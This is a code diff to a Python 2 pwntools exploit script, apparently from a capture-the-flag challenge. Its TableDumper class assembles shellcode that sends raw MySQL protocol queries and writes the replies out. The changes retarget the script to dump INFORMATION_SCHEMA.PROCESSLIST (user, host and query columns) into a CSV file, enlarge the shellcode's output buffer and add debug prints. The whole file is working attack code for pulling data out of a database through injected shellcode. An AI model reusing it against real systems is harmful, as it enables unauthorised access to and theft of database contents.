@@ -7,7 +7,7 @@ from pymysql.protocol import MysqlPacket
 import unicodedata
 import StringIO
 import csv
-
+import json
 
 context.arch = "amd64"
 context.os = "linux"
@@ -250,7 +250,7 @@ class TableDumper:
         shellcode += shellcraft.echo(p16(len(q)) + "\x00\x00\x03" + q, 4)
         shellcode += shellcraft.read(4, 'rsp', 200)
         shellcode += shellcraft.pushstr(self.html)
-        shellcode += shellcraft.write(1, 'rsp', 500)
+        shellcode += shellcraft.write(1, 'rsp', 1000)
         self.data = {
             "shell": asm(shellcode) + "\x00"
         }
@@ -316,7 +316,9 @@ class TableDumper:
         row = []
         assert(isinstance(row, list))
         for col in cols:
-            row.append(self.trim(self. get_cell(tbl, col, off, where)))
+            c = self.get_cell(tbl, col, off, where)
+            print c
+            row.append(self.trim(c))
         return row
 
     def dump_table(self, tbl, cols, where=None, as_list=False):
@@ -373,5 +375,22 @@ def get_cols():
 
 if __name__ == '__main__':
     d = TableDumper()
-    d.get_schema()
-    print d.recovered_schema
+    tbl = "INFORMATION_SCHEMA.PROCESSLIST"
+    cols = [
+        "ID",
+        "USER",
+        "HOST",
+        "DB",
+        "COMMAND",
+        "TIME",
+        "STATE",
+        "INFO"
+    ]
+    l = d.dump_table(tbl, cols, as_list=True)
+    f = open('data/{}'.format(tbl), 'w+')
+    writer = csv.writer(f)
+    writer.writerow(cols)
+    for line in l:
+        f.write(line)
+        f.write('\n')
+    f.close()
